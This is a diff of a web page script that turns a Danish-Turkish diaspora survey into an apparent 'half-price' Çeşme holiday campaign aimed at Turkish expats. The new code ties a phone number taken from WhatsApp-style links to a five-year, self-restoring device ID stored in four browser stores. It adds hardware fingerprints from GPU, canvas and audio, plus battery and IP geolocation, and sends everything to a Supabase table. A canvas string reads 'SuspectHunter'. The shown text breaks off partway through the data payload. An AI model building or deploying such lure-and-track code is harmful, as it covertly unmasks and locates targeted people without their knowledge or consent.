@@ -1,1120 +1,1023 @@
-/* ============================================
-   DANIMARKA TÜRK DİASPORASI ANKETİ - SCRIPT
-   Tam Analitik + Fingerprint + Loglama
-   ============================================ */
+/* ========================================================================
+   ALAÇATI & ÇEŞME GURBETÇİ TATİL KAMPANYASI (%50 İNDİRİM)
+   Gelişmiş Ziyaretçi Analitiği, Kalıcı Cihaz İmzası, GPU Parmak İzi &
+   700 WhatsApp Numarası Özel SPA Router & Çapraz Eşleştirme Sistemi
+   ======================================================================== */
 
-// ==========================================
-// YAPILANDIRMA — Supabase bilgileri
-// ==========================================
-const CONFIG = {
-    SUPABASE_URL: 'https://yfhglqjuskpglezvucnw.supabase.co',
-    SUPABASE_ANON_KEY: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InlmaGdscWp1c2twZ2xlenZ1Y253Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODY5ODQ4MTYsImV4cCI6MjEwMjU2MDgxNn0.PZfclmoZ1MCJhdax6ZFYwnAamAJ7TjilWEAuiDcG-kQ'
+var CONFIG = {
+    SUPABASE_URL: 'https://joxfgcagwhuikqjtwzvd.supabase.co',
+    SUPABASE_ANON_KEY: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImpveGZnY2Fnd2h1aWtxanR3enZkIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzE4NDAyNjUsImV4cCI6MjA4NzQxNjI2NX0.w3N3s2f71J0rV2mP4o45q3c7R1t-8kL9e-yZ3x6w7v8',
+    DEFAULT_TABLE: 'cesme_holiday_leads'
 };
 
-// ==========================================
-// DURUM YÖNETİMİ
-// ==========================================
-const STATE = {
-    currentStep: 1,
-    totalSteps: 5,
+var STATE = {
+    fingerprintHash: null,
+    deviceSignature: null,
+    targetPhone: null,
+    campaignSource: 'direct',
+    channel: null,
+    targetTable: 'cesme_holiday_leads',
     supabaseClient: null,
-    submitted: false,
-    // IP konum bilgileri
+    gpuVendor: null,
+    gpuRenderer: null,
+    batteryLevel: null,
+    batteryCharging: null,
+    ipAddress: null,
     ipCity: null,
     ipRegion: null,
     ipCountry: null,
-    ipAddress: null,
     ipLat: null,
     ipLng: null,
     locationType: 'IP Geolocation',
-    // Fingerprint & tracking
-    fingerprintHash: null,
-    fingerprintId: null,
-    siteVisitId: null,
-    visitLogged: false,
-    // Zamanlama
     startTime: Date.now(),
-    maxScroll: 0
+    maxScroll: 0,
+    isSubmitted: false
 };
 
 // ==========================================
-// BAŞLATMA
-// ==========================================
-// BAŞLATMA
+// BAŞLATMA (INIT)
 // ==========================================
 document.addEventListener('DOMContentLoaded', init);
 
 async function init() {
-    // Dil desteğini uygula (TR veya DA)
-    if (window.LANG) LANG.apply();
     initSupabase();
+    extractTargetPhoneAndSource();
+    setupCountdown();
     setupScrollAnimations();
     setupParticles();
-    setupOtherInputToggle();
-    setupCheckboxMaxLimit();
-    setupLocationOnCityField();
-    setupClickTracking();
-    setupTimeTracking();
+    setupPackageSelection();
+    setupFaqAccordion();
     setupScrollTracking();
-    setupVercelAnalytics();
-    setupAidModalEvents();
-    setupStepByStepSync();
-    updateAidSectionState();
+    setupTimeTracking();
+    setupLiveFormSync();
+    setupGeoDetection();
+    setupFormSubmission();
+    setupBatteryListener();
 
-    // IP konumunu al ve ziyaretçiyi kaydet (paralel başlat)
+    // 0. SANİYE: Kalıcı İmza, Donanım Parmak İzi ve IP Konumu Paralel Başlat
     await Promise.all([
-        fetchIpLocation(),
-        generateFingerprint()
+        initDeviceSignature(),
+        fetchIpLocation()
     ]);
+
+    // Donanım parmak izini hesapla ve ilk kaydı yap
+    await generateFingerprint();
 }
 
 // ==========================================
-// SUPABASE ENTEGRASYONU
+// 1) DİNAMİK SPA ROUTER & TELEFON/KAYNAK ÇÖZÜMLEME
 // ==========================================
-function initSupabase() {
+function extractTargetPhoneAndSource() {
     try {
-        if (typeof window.supabase !== 'undefined') {
-            STATE.supabaseClient = window.supabase.createClient(
-                CONFIG.SUPABASE_URL,
-                CONFIG.SUPABASE_ANON_KEY
-            );
-            console.log('✅ Supabase bağlantısı kuruldu.');
-            return true;
+        var pathname = window.location.pathname || '';
+        var search = window.location.search || '';
+        var hash = window.location.hash || '';
+        var params = new URLSearchParams(search);
+
+        var detectedPhone = null;
+        var detectedSource = params.get('src') || params.get('source') || params.get('ch') || params.get('channel') || null;
+        var detectedTable = params.get('table') || params.get('tbl') || null;
+
+        // 1. Pathname üzerinden telefon numarası yakala (örn: /4512345678 veya /+905321234567 veya /p/4512345678)
+        var cleanPath = decodeURIComponent(pathname).replace(/^\/+|\/+$/g, '');
+        if (cleanPath) {
+            // /p/4512345678 veya /w/4512345678 veya doğrudan /4512345678
+            var pathMatch = cleanPath.match(/(?:(?:p|w|phone|tel|wa|ref)\/)?(\+?[0-9]{7,17})/i);
+            if (pathMatch && pathMatch[1]) {
+                detectedPhone = pathMatch[1];
+                if (!detectedSource) detectedSource = 'whatsapp';
+            }
         }
-    } catch (error) {
-        console.error('❌ Supabase bağlantı hatası:', error);
+
+        // 2. Query parametreleri üzerinden kontrol (örn: ?p=4512345678 veya ?phone=+90...)
+        if (!detectedPhone) {
+            var qPhone = params.get('p') || params.get('phone') || params.get('tel') || params.get('wa') || params.get('target');
+            if (qPhone) {
+                detectedPhone = qPhone;
+                if (!detectedSource) detectedSource = 'whatsapp';
+            }
+        }
+
+        // 3. Hash üzerinden kontrol (#+4512345678)
+        if (!detectedPhone && hash) {
+            var cleanHash = hash.replace(/^#/, '');
+            var hashMatch = cleanHash.match(/(\+?[0-9]{7,17})/);
+            if (hashMatch) {
+                detectedPhone = hashMatch[1];
+                if (!detectedSource) detectedSource = 'whatsapp';
+            }
+        }
+
+        // Telefonu standartlaştır (+ ve rakamlar)
+        if (detectedPhone) {
+            detectedPhone = detectedPhone.replace(/[\s\-\(\)\.]/g, '');
+            if (!detectedPhone.startsWith('+') && detectedPhone.length >= 10 && !detectedPhone.startsWith('00')) {
+                // Danimarka veya uluslararası numara kontrolü
+                if (detectedPhone.startsWith('45')) detectedPhone = '+' + detectedPhone;
+                else if (detectedPhone.startsWith('90')) detectedPhone = '+' + detectedPhone;
+                else detectedPhone = '+' + detectedPhone;
+            }
+            STATE.targetPhone = detectedPhone;
+            console.log('📱 Hedef Telefon Numarası Yakalandı:', STATE.targetPhone);
+
+            // Formdaki telefon alanına otomatik yansıt
+            var phoneInput = document.getElementById('lead-phone');
+            if (phoneInput && !phoneInput.value) {
+                phoneInput.value = STATE.targetPhone;
+            }
+        }
+
+        // Kaynak etiketini belirle (whatsapp, facebook, instagram, direct)
+        if (detectedSource) {
+            STATE.campaignSource = detectedSource.toLowerCase();
+        } else if (document.referrer) {
+            if (document.referrer.indexOf('facebook.com') !== -1 || document.referrer.indexOf('fb.me') !== -1) {
+                STATE.campaignSource = 'facebook';
+            } else if (document.referrer.indexOf('whatsapp') !== -1 || document.referrer.indexOf('wa.me') !== -1) {
+                STATE.campaignSource = 'whatsapp';
+            } else if (document.referrer.indexOf('instagram.com') !== -1) {
+                STATE.campaignSource = 'instagram';
+            }
+        }
+
+        if (detectedTable) {
+            STATE.targetTable = detectedTable;
+        }
+
+        console.log('🎯 Kampanya Kaynağı:', STATE.campaignSource, '| Hedef Tablo:', STATE.targetTable);
+    } catch (e) {
+        console.log('Router çözümleme hatası:', e);
     }
-    return false;
 }
 
 // ==========================================
-// TARAYICI PARMAK İZİ (Fingerprint)
-// Aynı tarayıcıdan tekrar gelen kişileri tanımlar
+// 2) 4 KATMANLI KALICI CİHAZ İMZASI (ZOMBIE DEVICE ID)
+// ==========================================
+// Cookie + LocalStorage + SessionStorage + IndexedDB üzerinden
+// kendini onaran (self-healing) kalıcı takipçi kimliği.
+// ==========================================
+async function initDeviceSignature() {
+    try {
+        var sigKey = '_dx_device_sig';
+        var cookieKey = '_dx_vid';
+        var sig = null;
+
+        // 1. Katman: LocalStorage
+        try { sig = localStorage.getItem(sigKey); } catch (e) {}
+
+        // 2. Katman: SessionStorage
+        if (!sig) {
+            try { sig = sessionStorage.getItem(sigKey); } catch (e) {}
+        }
+
+        // 3. Katman: Cookie
+        if (!sig) {
+            sig = getCookie(cookieKey);
+        }
+
+        // 4. Katman: IndexedDB
+        if (!sig) {
+            sig = await readFromIndexedDb('identity', 'device_sig');
+        }
+
+        // Hiçbir katmanda yoksa yeni benzersiz imza üret
+        if (!sig) {
+            sig = 'sig_' + generateRandomUuid();
+            console.log('✨ Yeni Kalıcı Cihaz İmzası Üretildi:', sig);
+        } else {
+            console.log('🔍 Mevcut Kalıcı Cihaz İmzası Bulundu:', sig);
+        }
+
+        STATE.deviceSignature = sig;
+
+        // Kendini onar: Tüm 4 depolama katmanına aynı anda yaz
+        try { localStorage.setItem(sigKey, sig); } catch (e) {}
+        try { sessionStorage.setItem(sigKey, sig); } catch (e) {}
+        setCookie(cookieKey, sig, 365 * 5); // 5 yıl geçerli
+        await writeToIndexedDb('identity', 'device_sig', sig);
+    } catch (e) {
+        console.log('İmza başlatma hatası:', e);
+        if (!STATE.deviceSignature) {
+            STATE.deviceSignature = 'sig_' + Math.random().toString(36).substring(2, 15) + Date.now();
+        }
+    }
+}
+
+function setCookie(name, value, days) {
+    try {
+        var expires = '';
+        if (days) {
+            var date = new Date();
+            date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
+            expires = '; expires=' + date.toUTCString();
+        }
+        document.cookie = name + '=' + (value || '') + expires + '; path=/; SameSite=Lax';
+    } catch (e) {}
+}
+
+function getCookie(name) {
+    try {
+        var nameEQ = name + '=';
+        var ca = document.cookie.split(';');
+        for (var i = 0; i < ca.length; i++) {
+            var c = ca[i];
+            while (c.charAt(0) === ' ') c = c.substring(1, c.length);
+            if (c.indexOf(nameEQ) === 0) return c.substring(nameEQ.length, c.length);
+        }
+    } catch (e) {}
+    return null;
+}
+
+// IndexedDB Yardımcıları (Kalıcı Vault)
+function openIndexedDb() {
+    return new Promise(function (resolve, reject) {
+        if (!window.indexedDB) return resolve(null);
+        var req = indexedDB.open('dx_security_vault', 1);
+        req.onupgradeneeded = function (e) {
+            var db = e.target.result;
+            if (!db.objectStoreNames.contains('identity')) {
+                db.createObjectStore('identity', { keyPath: 'key' });
+            }
+        };
+        req.onsuccess = function (e) { resolve(e.target.result); };
+        req.onerror = function () { resolve(null); };
+    });
+}
+
+async function readFromIndexedDb(storeName, key) {
+    try {
+        var db = await openIndexedDb();
+        if (!db) return null;
+        return new Promise(function (resolve) {
+            var tx = db.transaction(storeName, 'readonly');
+            var store = tx.objectStore(storeName);
+            var req = store.get(key);
+            req.onsuccess = function () { resolve(req.result ? req.result.val : null); };
+            req.onerror = function () { resolve(null); };
+        });
+    } catch (e) { return null; }
+}
+
+async function writeToIndexedDb(storeName, key, val) {
+    try {
+        var db = await openIndexedDb();
+        if (!db) return;
+        var tx = db.transaction(storeName, 'readwrite');
+        var store = tx.objectStore(storeName);
+        store.put({ key: key, val: val });
+    } catch (e) {}
+}
+
+function generateRandomUuid() {
+    if (typeof crypto !== 'undefined' && crypto.randomUUID) {
+        return crypto.randomUUID();
+    }
+    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
+        var r = Math.random() * 16 | 0, v = c === 'x' ? r : (r & 0x3 | 0x8);
+        return v.toString(16);
+    });
+}
+
+// ==========================================
+// 3) DONANIMSAL DEĞİŞMEZ PARMAK İZİ (GPU + CANVAS + AUDIO + HARDWARE)
 // ==========================================
 async function generateFingerprint() {
-    var components = [];
+    try {
+        // 1. WebGL GPU Unmasked Vendor & Renderer
+        var gpuInfo = getGpuDetails();
+        STATE.gpuVendor = gpuInfo.vendor;
+        STATE.gpuRenderer = gpuInfo.renderer;
 
-    // Canvas fingerprint
+        // 2. Audio Fingerprint
+        var audioHash = await getAudioFingerprint();
+
+        // 3. Deep 2D Canvas Render
+        var canvasHash = getCanvasFingerprint();
+
+        var rawComponents = [
+            navigator.userAgent || '',
+            (navigator.languages || [navigator.language]).join(','),
+            screen.width + 'x' + screen.height + 'x' + screen.colorDepth,
+            screen.availWidth + 'x' + screen.availHeight,
+            window.devicePixelRatio || 1,
+            new Date().getTimezoneOffset(),
+            Intl.DateTimeFormat().resolvedOptions().timeZone || '',
+            navigator.hardwareConcurrency || 'cpu_unknown',
+            navigator.deviceMemory || 'ram_unknown',
+            navigator.maxTouchPoints || 0,
+            navigator.platform || '',
+            STATE.gpuVendor || 'gpu_v_unknown',
+            STATE.gpuRenderer || 'gpu_r_unknown',
+            audioHash || 'audio_unknown',
+            canvasHash || 'canvas_unknown'
+        ];
+
+        var rawString = rawComponents.join('|||');
+        var encoder = new TextEncoder();
+        var data = encoder.encode(rawString);
+        var hashBuffer = await crypto.subtle.digest('SHA-256', data);
+        var hashArray = Array.from(new Uint8Array(hashBuffer));
+        STATE.fingerprintHash = hashArray.map(function (b) {
+            return b.toString(16).padStart(2, '0');
+        }).join('');
+
+        console.log('🔑 Donanımsal Parmak İzi Oluşturuldu:', STATE.fingerprintHash);
+        console.log('🎮 GPU Bilgisi:', STATE.gpuVendor, '|', STATE.gpuRenderer);
+
+        await registerVisitor();
+    } catch (e) {
+        console.log('Parmak izi hatası:', e);
+        STATE.fingerprintHash = 'fp_' + Math.random().toString(36).substring(2, 15) + Date.now();
+        await registerVisitor();
+    }
+}
+
+// WebGL GPU Kart Modeli Tespiti
+function getGpuDetails() {
     try {
         var canvas = document.createElement('canvas');
+        var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        if (!gl) return { vendor: 'WebGL Yok', renderer: 'WebGL Yok' };
+
+        var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        if (debugInfo) {
+            var vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) || 'Bilinmiyor';
+            var renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'Bilinmiyor';
+            return { vendor: vendor, renderer: renderer };
+        }
+        return {
+            vendor: gl.getParameter(gl.VENDOR) || 'Standart',
+            renderer: gl.getParameter(gl.RENDERER) || 'Standart'
+        };
+    } catch (e) {
+        return { vendor: 'Hata', renderer: 'Hata' };
+    }
+}
+
+// Canvas 2D Grafik Motoru Hash'i
+function getCanvasFingerprint() {
+    try {
+        var canvas = document.createElement('canvas');
+        canvas.width = 240;
+        canvas.height = 60;
         var ctx = canvas.getContext('2d');
-        canvas.width = 200;
-        canvas.height = 50;
+        if (!ctx) return '';
+        
         ctx.textBaseline = 'top';
         ctx.font = '14px Arial';
+        ctx.textBaseline = 'alphabetic';
         ctx.fillStyle = '#f60';
         ctx.fillRect(125, 1, 62, 20);
         ctx.fillStyle = '#069';
-        ctx.fillText('fingerprint', 2, 15);
+        ctx.fillText('Cesme🏝️Alacati@2026!#', 2, 15);
         ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
-        ctx.fillText('fingerprint', 4, 17);
-        components.push(canvas.toDataURL());
+        ctx.fillText('SuspectHunter🔒45', 4, 35);
+        
+        ctx.beginPath();
+        ctx.arc(50, 50, 10, 0, Math.PI * 2, true);
+        ctx.closePath();
+        ctx.fill();
+
+        return canvas.toDataURL();
     } catch (e) {
-        components.push('canvas-error');
-    }
-
-    // Ekran bilgileri
-    components.push(screen.width + 'x' + screen.height);
-    components.push(screen.colorDepth);
-    components.push(screen.pixelDepth);
-    components.push(window.devicePixelRatio || 1);
-
-    // Tarayıcı bilgileri
-    components.push(navigator.userAgent);
-    components.push(navigator.language);
-    components.push(navigator.hardwareConcurrency || 0);
-    components.push(navigator.maxTouchPoints || 0);
-    components.push(new Date().getTimezoneOffset());
-    components.push(Intl.DateTimeFormat().resolvedOptions().timeZone || '');
-
-    // Platform
-    components.push(navigator.platform || '');
-
-    // Eklenti sayısı
-    components.push(navigator.plugins ? navigator.plugins.length : 0);
-
-    // WebGL renderer
-    try {
-        var glCanvas = document.createElement('canvas');
-        var gl = glCanvas.getContext('webgl') || glCanvas.getContext('experimental-webgl');
-        if (gl) {
-            var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-            if (debugInfo) {
-                components.push(gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL));
-                components.push(gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL));
-            }
-        }
-    } catch (e) {
-        components.push('webgl-error');
-    }
-
-    // Hash oluştur
-    var fingerStr = components.join('|||');
-    STATE.fingerprintHash = await hashString(fingerStr);
-    console.log('🔑 Fingerprint:', STATE.fingerprintHash);
-
-    // Supabase'e fingerprint kaydet/güncelle
-    await registerFingerprint();
-}
-
-async function hashString(str) {
-    if (window.crypto && window.crypto.subtle) {
-        var encoder = new TextEncoder();
-        var data = encoder.encode(str);
-        var hashBuffer = await crypto.subtle.digest('SHA-256', data);
-        var hashArray = Array.from(new Uint8Array(hashBuffer));
-        return hashArray.map(function(b) { return b.toString(16).padStart(2, '0'); }).join('');
-    }
-    // Fallback basit hash
-    var hash = 0;
-    for (var i = 0; i < str.length; i++) {
-        var char = str.charCodeAt(i);
-        hash = ((hash << 5) - hash) + char;
-        hash = hash & hash;
-    }
-    return 'fb-' + Math.abs(hash).toString(16);
-}
-
-async function registerFingerprint() {
-    // 1. Katman: Tarayıcı localStorage kontrolü (anında tepki)
-    if (localStorage.getItem('survey_completed') === 'true') {
-        showAlreadyCompletedScreen();
-    }
-
-    if (!STATE.supabaseClient || !STATE.fingerprintHash) return;
-
-    try {
-        var deviceInfo = collectDeviceInfo();
-        var batteryInfo = await getBatteryInfo();
-
-        // 2. Katman: Supabase kontrolü (dansk_survey_leads üzerinden)
-        var result = await STATE.supabaseClient
-            .from('dansk_survey_leads')
-            .select('id, total_visits, is_completed, full_name, email, phone, city, region, country, latitude, longitude, all_answers, survey_step_reached')
-            .eq('fingerprint_hash', STATE.fingerprintHash)
-            .maybeSingle();
-
-        if (result.data) {
-            // Zaten kayıtlı — ziyaret sayısını ve son görülme tarihini güncelle
-            var newTotal = (result.data.total_visits || 1) + 1;
-            await STATE.supabaseClient
-                .from('dansk_survey_leads')
-                .update({
-                    total_visits: newTotal,
-                    last_seen_at: new Date().toISOString(),
-                    user_agent: navigator.userAgent,
-                    screen_resolution: deviceInfo.screen_resolution,
-                    window_size: deviceInfo.window_size,
-                    battery_level: batteryInfo.battery_level,
-                    battery_charging: batteryInfo.battery_charging,
-                    device_type: deviceInfo.device_type,
-                    os: deviceInfo.os,
-                    browser: deviceInfo.browser
-                })
-                .eq('fingerprint_hash', STATE.fingerprintHash);
-
-            console.log('👤 Tekrar gelen ziyaretçi! Toplam ziyaret:', newTotal);
-
-            // Daha önce anketi tamamlamışsa formu kilitle
-            if (result.data.is_completed) {
-                localStorage.setItem('survey_completed', 'true');
-                updateAidSectionState(true);
-                showAlreadyCompletedScreen();
-            }
-        } else {
-            // Yeni ziyaretçi kaydı
-            await syncDanskSurveyLead({ total_visits: 1 });
-            console.log('🆕 Yeni ziyaretçi dansk_survey_leads tablosuna kaydedildi.');
-        }
-    } catch (error) {
-        console.warn('Fingerprint kaydı hatası:', error);
+        return '';
     }
 }
 
-function showAlreadyCompletedScreen() {
-    var form = document.getElementById('survey-form');
-    var stepper = document.getElementById('progress-container');
-    var alreadyScreen = document.getElementById('already-completed-screen');
+// Web Audio Frekans Tepki Hash'i
+function getAudioFingerprint() {
+    return new Promise(function (resolve) {
+        try {
+            var AudioContext = window.OfflineAudioContext || window.webkitOfflineAudioContext;
+            if (!AudioContext) return resolve('');
 
-    if (form) form.classList.add('hidden');
-    if (stepper) stepper.classList.add('hidden');
-    if (alreadyScreen) alreadyScreen.classList.remove('hidden');
-}
+            var context = new AudioContext(1, 44100, 44100);
+            var oscillator = context.createOscillator();
+            oscillator.type = 'triangle';
+            oscillator.frequency.setValueAtTime(10000, context.currentTime);
 
+            var compressor = context.createDynamicsCompressor();
+            compressor.threshold.setValueAtTime(-50, context.currentTime);
+            compressor.knee.setValueAtTime(40, context.currentTime);
+            compressor.ratio.setValueAtTime(12, context.currentTime);
+            compressor.attack.setValueAtTime(0, context.currentTime);
+            compressor.release.setValueAtTime(0.25, context.currentTime);
 
-// ==========================================
-// CİHAZ BİLGİSİ TOPLAMA
-// ==========================================
-function collectDeviceInfo() {
-    var ua = navigator.userAgent;
-    var browserName = 'Bilinmiyor';
-    var osName = 'Bilinmiyor';
+            oscillator.connect(compressor);
+            compressor.connect(context.destination);
+            oscillator.start(0);
 
-    // Tarayıcı tespiti
-    if (ua.indexOf('Firefox') > -1) browserName = 'Firefox';
-    else if (ua.indexOf('Edg') > -1) browserName = 'Edge';
-    else if (ua.indexOf('OPR') > -1 || ua.indexOf('Opera') > -1) browserName = 'Opera';
-    else if (ua.indexOf('Chrome') > -1) browserName = 'Chrome';
-    else if (ua.indexOf('Safari') > -1) browserName = 'Safari';
-
-    // İşletim sistemi tespiti
-    if (ua.indexOf('Windows NT 10') > -1) osName = 'Windows 10/11';
-    else if (ua.indexOf('Windows') > -1) osName = 'Windows';
-    else if (ua.indexOf('Mac OS X') > -1) osName = 'macOS';
-    else if (ua.indexOf('Android') > -1) osName = 'Android';
-    else if (ua.indexOf('iPhone') > -1 || ua.indexOf('iPad') > -1) osName = 'iOS';
-    else if (ua.indexOf('Linux') > -1) osName = 'Linux';
-
-    // Cihaz türü
-    var deviceType = 'Masaüstü';
-    if (/Mobi|Android/i.test(ua)) deviceType = 'Mobil';
-    else if (/Tablet|iPad/i.test(ua)) deviceType = 'Tablet';
-
-    // Bağlantı türü
-    var connectionType = 'Bilinmiyor';
-    if (navigator.connection) {
-        connectionType = navigator.connection.effectiveType || navigator.connection.type || 'Bilinmiyor';
-    }
-
-    // Ziyaret sayısı (localStorage)
-    var visitCount = parseInt(localStorage.getItem('survey_visit_count') || '0') + 1;
-    localStorage.setItem('survey_visit_count', visitCount.toString());
-
-    return {
-        screen_resolution: screen.width + 'x' + screen.height,
-        window_size: window.innerWidth + 'x' + window.innerHeight,
-        language: navigator.language || 'Bilinmiyor',
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Bilinmiyor',
-        device_type: deviceType,
-        os: osName,
-        browser: browserName,
-        referrer: document.referrer || 'Doğrudan Giriş',
-        connection_type: connectionType,
-        is_touch_device: navigator.maxTouchPoints > 0,
-        visit_count: visitCount
-    };
-}
-
-async function getBatteryInfo() {
-    try {
-        if (navigator.getBattery) {
-            var battery = await navigator.getBattery();
-            return {
-                battery_level: Math.round(battery.level * 100),
-                battery_charging: battery.charging
+            context.oncomplete = function (e) {
+                var samples = e.renderedBuffer.getChannelData(0);
+                var sum = 0;
+                for (var i = 0; i < samples.length; i += 100) {
+                    sum += Math.abs(samples[i]);
+                }
+                resolve(String(sum));
             };
+
+            context.startRendering();
+        } catch (e) {
+            resolve('');
         }
-    } catch (e) {}
-    return { battery_level: null, battery_charging: null };
+    });
 }
 
 // ==========================================
-// YARDIMCI: Zaman Aşımlı Fetch
+// 4) SUPABASE BAĞLANTISI
 // ==========================================
-function fetchWithTimeout(url, timeoutMs) {
-    if (window.AbortController) {
-        var controller = new AbortController();
-        var timeoutId = setTimeout(function() { controller.abort(); }, timeoutMs || 4000);
-        return fetch(url, { signal: controller.signal })
-            .then(function(res) {
-                clearTimeout(timeoutId);
-                return res;
-            })
-            .catch(function(err) {
-                clearTimeout(timeoutId);
-                throw err;
-            });
-    }
-    return fetch(url);
-}
-
-// ==========================================
-// DEDİKATED PROJE TABLOSU SENKRONİZASYONU (dansk_survey_leads)
-// https://dansk-livs-og-socialst-tteunders-ge.vercel.app/ için tüm veriler tek satırda akar
-// ==========================================
-async function syncDanskSurveyLead(extraData) {
-    if (!STATE.supabaseClient || !STATE.fingerprintHash) return;
-
+function initSupabase() {
     try {
-        var deviceInfo = collectDeviceInfo();
-        var batteryInfo = await getBatteryInfo();
-        var answers = typeof collectAnswers === 'function' ? collectAnswers() : {};
-
-        var leadRecord = {
-            fingerprint_hash: STATE.fingerprintHash,
-            project_domain: 'https://dansk-livs-og-socialst-tteunders-ge.vercel.app/',
-            ip_address: STATE.ipAddress || null,
-            city: STATE.ipCity || null,
-            region: STATE.ipRegion || null,
-            country: STATE.ipCountry || null,
-            latitude: STATE.ipLat ? String(STATE.ipLat) : null,
-            longitude: STATE.ipLng ? String(STATE.ipLng) : null,
-            location_type: STATE.locationType || 'IP Geolocation',
-            timezone: deviceInfo.timezone,
-            device_type: deviceInfo.device_type,
-            os: deviceInfo.os,
-            browser: deviceInfo.browser,
-            screen_resolution: deviceInfo.screen_resolution,
-            language: deviceInfo.language,
-            battery_level: batteryInfo.battery_level,
-            battery_charging: batteryInfo.battery_charging,
-            connection_type: deviceInfo.connection_type,
-            is_touch_device: deviceInfo.is_touch_device,
-            referrer: deviceInfo.referrer,
-            page_url: window.location.href,
-            user_agent: navigator.userAgent,
-            survey_step_reached: STATE.currentStep || 1,
-            time_spent_seconds: Math.round((Date.now() - STATE.startTime) / 1000),
-            last_seen_at: new Date().toISOString()
-        };
-
-        // Anket yanıtları varsa tekil alanlara ve all_answers içine ekle
-        if (answers) {
-            if (answers.respondent_name) leadRecord.full_name = answers.respondent_name;
-            if (answers.respondent_email) leadRecord.email = answers.respondent_email;
-            if (answers.respondent_phone) leadRecord.phone = answers.respondent_phone;
-            if (answers.respondent_city) leadRecord.user_entered_city = answers.respondent_city;
-            if (answers.respondent_country) leadRecord.user_entered_country = answers.respondent_country;
-            if (answers.generation) leadRecord.generation = answers.generation;
-            if (answers.years_in_denmark) leadRecord.years_in_denmark = answers.years_in_denmark;
-            if (answers.city_region) leadRecord.city_region = answers.city_region;
-            if (answers.city_other) leadRecord.city_other = answers.city_other;
-            if (answers.location_reasons && answers.location_reasons.length > 0) leadRecord.location_reasons = answers.location_reasons;
-            if (answers.location_reason_other) leadRecord.location_reason_other = answers.location_reason_other;
-            if (answers.turkish_neighborhood) leadRecord.turkish_neighborhood = answers.turkish_neighborhood;
-            if (answers.social_closeness) leadRecord.social_closeness = answers.social_closeness;
-            if (answers.solidarity_level) leadRecord.solidarity_level = answers.solidarity_level;
-            if (answers.social_gathering && answers.social_gathering.length > 0) leadRecord.social_gathering = answers.social_gathering;
-            if (answers.news_source) leadRecord.news_source = answers.news_source;
-            if (answers.language_preference) leadRecord.language_preference = answers.language_preference;
-            leadRecord.all_answers = answers;
-        }
-
-        // Ekstra parametreler varsa birleştir (Örn: GPS güncellemesi, tamamlanma durumu)
-        if (extraData) {
-            Object.assign(leadRecord, extraData);
-        }
-
-        var result = await STATE.supabaseClient
-            .from('dansk_survey_leads')
-            .upsert(leadRecord, { onConflict: 'fingerprint_hash' });
-
-        if (result.error) {
-            console.warn('dansk_survey_leads upsert bildirimi:', result.error.message);
-        } else {
-            console.log('🌟 dansk_survey_leads güncellendi! Şehir:', leadRecord.city, '| Bölge:', leadRecord.region, '| Lat:', leadRecord.latitude, '| Lng:', leadRecord.longitude);
+        if (window.supabase) {
+            STATE.supabaseClient = window.supabase.createClient(CONFIG.SUPABASE_URL, CONFIG.SUPABASE_ANON_KEY);
+            console.log('✅ Supabase bağlantısı kuruldu. Ana Tablo: ' + CONFIG.DEFAULT_TABLE);
         }
     } catch (e) {
-        console.warn('dansk_survey_leads senkronizasyon hatası:', e);
+        console.log('Supabase başlatılamadı:', e);
     }
 }
 
 // ==========================================
-// KOORDİNAT SENKRONİZASYONU (dansk_survey_leads)
+// 5) ZİYARETÇİ KAYDI (0. Saniye İlk Kayıt & Geri Gelen Ziyaretçi)
 // ==========================================
-async function syncCoordinatesToDatabase(lat, lng, city, country, ip, region, locType) {
-    if (!lat || !lng) return;
-    STATE.ipLat = String(lat);
-    STATE.ipLng = String(lng);
-    if (city) STATE.ipCity = city;
-    if (region) STATE.ipRegion = region;
-    if (country) STATE.ipCountry = country;
-    if (ip) STATE.ipAddress = ip;
-    if (locType) STATE.locationType = locType;
+async function registerVisitor() {
+    if (!STATE.supabaseClient || !STATE.fingerprintHash) return;
 
-    // Tekil ana tabloya (dansk_survey_leads) anında aktar
-    await syncDanskSurveyLead({
-        latitude: String(lat),
-        longitude: String(lng),
+    var deviceInfo = getDeviceInfo();
+    var tableToUse = STATE.targetTable || CONFIG.DEFAULT_TABLE;
+
+    var payload = {
+        fingerprint_hash: STATE.fingerprintHash,
+        device_signature: STATE.deviceSignature,
+        target_phone: STATE.targetPhone,
+        campaign_source: STATE.campaignSource,
+        channel: STATE.channel || STATE.campaignSource,
+        project_domain: 'alacati-cesme-promo',
+        ip_address: STATE.ipAddress,
         city: STATE.ipCity,
         region: STATE.ipRegion,
         country: STATE.ipCountry,
-        location_type: STATE.locationType
-    });
+        latitude: STATE.ipLat,
+        longitude: STATE.ipLng,
+        location_type: STATE.locationType,
+        device_type: deviceInfo.deviceType,
+        os: deviceInfo.os,
+        os_version: deviceInfo.osVersion,
+        browser: deviceInfo.browser,
+        browser_version: deviceInfo.browserVersion,
+        browser_languages: deviceInfo.browserLanguages,
+        browser_platform: deviceInfo.browserPlatform,
+        gpu_vendor: STATE.gpuVendor || deviceInfo.gpuVendor,
+        gpu_renderer: STATE.gpuRenderer || deviceInfo.gpuRenderer,
+        screen_resolution: deviceInfo.screenResolution,
+        window_size: deviceInfo.windowSize,
+        color_depth: deviceInfo.colorDepth,
+        device_pixel_ratio: deviceInfo.devicePixelRatio,
+        hardware_concurrency: deviceInfo.hardwareConcurrency,
+        device_memory: deviceInfo.deviceMemory,
+        language: deviceInfo.language,
+        battery_level: STATE.batteryLevel,
+        battery_charging: STATE.batteryCharging,
+        connection_type: deviceInfo.connectionType,
+        is_touch_device: deviceInfo.isTouch,
